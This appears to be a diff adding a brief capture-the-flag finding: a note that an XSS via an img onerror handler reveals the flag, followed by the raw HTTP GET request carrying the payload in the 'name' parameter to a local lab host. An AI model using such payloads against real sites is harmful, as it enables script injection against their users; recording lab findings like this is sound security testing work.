@@ -1,0 +1,4 @@
+# XSS via img onerror handler reveals CTF flag in response body
+
+GET /page?name=<img+src=x+onerror=alert('XSS')> HTTP/1.1
+Host: 172.17.0.1:36025
